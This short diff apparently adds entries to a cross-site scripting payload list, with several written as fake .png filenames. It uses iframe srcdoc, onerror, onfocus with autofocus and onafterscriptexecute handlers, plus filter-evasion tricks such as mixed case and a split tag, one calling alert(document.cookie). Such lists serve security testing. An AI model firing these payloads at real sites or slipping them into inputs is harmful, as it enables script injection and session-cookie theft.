@@ -1,0 +1,6 @@
+<iframe srcdoc='<img src="" onerror=prompt>'>.png
+<address onafterscriptexecute=alert(1)><script>1<script>
+
+"><input onfocus=alert(1) autofocus><img Src=x OnerroR=prompt()>.png
+
+"><<c>img src=x onerror=alert(document.cookie)>
